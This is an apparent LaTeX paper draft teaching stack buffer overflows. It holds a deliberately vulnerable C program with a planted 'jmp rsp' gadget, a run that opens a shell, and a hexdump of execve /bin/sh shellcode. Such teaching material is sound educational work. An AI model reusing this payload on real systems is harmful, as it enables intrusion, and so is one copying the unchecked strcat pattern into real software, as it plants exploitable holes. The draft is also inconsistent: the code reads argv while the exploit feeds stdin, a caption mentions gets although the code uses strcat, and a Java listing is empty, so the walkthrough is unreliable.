### 2023-06-20 paper.tex
haha

\begin{lstlisting}[caption={Program vulnerable to a buffer  overflow}
      ,label={lst:label}
      ,language=Java]

\end{lstlisting}

>>>>

Below \ref{lst:bof} is an example of a vulnerable program.

\begin{minipage}{\linewidth}
\begin{lstlisting}[caption={Buffer overflow shellcoding example}
      ,label={lst:bof}
      ,language=C]
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* This function is a gadget typically
 * found through Return Oriented Programming (ROP)
 * in a larger binary, and it's crucial
 * for changing control flow.
 * It serves to demonstrate the general
 * concept in this simplified context.
 *
 * In a real-life scenario,
 * it would be necessary to find this gadget
 * or pivot the stack in a different manner.
 */
extern void __attribute__((naked)) helper_gadget() {
        __asm(".intel_syntax noprefix\n"
              "jmp rsp\n"
              ".att_syntax\n");
}

/* Example of a vulnerable function in which
 * the size of the concatenated strings is not
 * checked to be less than the size of the
 * buffer in which they are concatenated.
 *
 * This would most likely never cause issues
 * because names are almost never this long, but
 * it is easy for an attacker to exploit this.
 */
void say_hi(char* name) {
        char local_buffer[0x100];

        strcat(local_buffer, "Hi ");
        strcat(local_buffer, name);
        strcat(local_buffer, "!");

        puts(local_buffer);

        return;
}

int main(int argc, char** argv) {
        if (argc != 2) {
                fprintf(stderr, "usage: say_hi <name>\n");
                return 1;
        }

        say_hi(argv[1]);

        return 0;
}
\end{lstlisting}
\end{minipage}

Running the program with my name gives an expected output:
\begin{lstlisting}[caption={Non-malicious input}
      ,label={lst:bof_valid}
      ,language=bash]
$ ./say_hi Liviu
Hi Liviu!
\end{lstlisting}

But running the program with the following malicious crafted input we get
a vastly different result:

\begin{lstlisting}[caption={Malicious input}
      ,label={lst:bof_malicious}
      ,language=bash]
# The `cat` command is used just to keep
# the stdin of the `say_hi` program open
$ cat shellcode_malicious_input.bin - | ./say_hi
aaaa
Hi !
ls
Makefile  say_hi  shellcode_malicious_input.bin
\end{lstlisting}

\begin{lstlisting}[caption={Hexdump of malicious input}
      ,label={lst:bof_malicous_hex}
      ,language=bash]
0000000 0000 0000 0000 0000 0000 0000 0000 0000
*
0000100 0000 0000 0000 0000 115a 0040 0000 0000
0000110 9090 9090 9090 9090 9090 9090 9090 9090
*
0000310 8148 80ec 0000 6a00 4868 2fb8 6962 2f6e
0000320 2f2f 5073 8948 68e7 6972 0101 3481 0124
0000330 0101 3101 56f6 086a 485e e601 4856 e689
0000340 d231 3b6a 0f58 0005
0000347
\end{lstlisting}
Our simple program seems to be behaving like a system shell. We will now analyse
what happened during the execution of our program. Here~\ref{lst:bof_malicous_hex}
is a hexdump of the input. Let's break it down:

\begin{figure}[ht]%
  \centering
  \begin{tikzpicture}[node distance=2cm]
    \tikzstyle{block} = [rectangle, draw, fill=blue!20, text width=5em, text
    centered, minimum height=2em, text width=5cm,
               text depth=0.25cm,
               text height=1em,
               align=center]
    \tikzstyle{line} = [draw, -latex']

    % Define matrix
    \matrix [matrix of nodes,
      nodes=block,
      column sep=0cm,
      row sep=0cm
    ] (stack) {
      {...} \\
      |[fill=red!20, minimum height=5em]|
      {return address (to \emph{libc\_start\_call\_main})} \\
      {\emph{rbp} of \emph{libc\_start\_call\_main}} \\
      |[fill=red!20]|
      {return address (to \emph{main})} \\
      {\emph{RBP} of \emph{main}} \\
      |[minimum height=12em]|
      {\emph{local\_buffer}} \\
    };

    % Draw arrow with two right angles
    % \draw [red,thick,->] (stack-1-1.east) -- +(2cm,0) |- (stack-5-1.east) node[midway, right, black] {Pointer};
    \draw [red,thick,->] ([xshift=3cm]stack-6-1.south east) --
    ([xshift=0cm]stack-6-1.south east) node[midway, above, black] {rsp};

    \draw [red,thick,->] ([xshift=3cm]stack-4-1.east) --
    ([xshift=0cm]stack-4-1.east) node[midway, above, black] {rbp};

    \draw [decorate,decoration={brace,amplitude=10pt,mirror}]
    (stack-6-1.north west) -- (stack-6-1.south west)
    node[midway,xshift=-1.5cm,] {0x100 bytes};

    \draw [decorate,decoration={brace,amplitude=10pt,mirror}]
    (stack-5-1.north west) -- (stack-5-1.south west)
    node[midway,xshift=-1.5cm,] {0x8 bytes};

    \draw [decorate,decoration={brace,amplitude=10pt,mirror}]
    (stack-4-1.north west) -- (stack-4-1.south west)
    node[midway,xshift=-1.5cm,] {0x8 bytes};

  \end{tikzpicture}
  \caption{\label{fig:label} State of the stack before executing \emph{gets} in the function \emph{say\_hi}}%
  \label{fig:stackframe}
\end{figure}
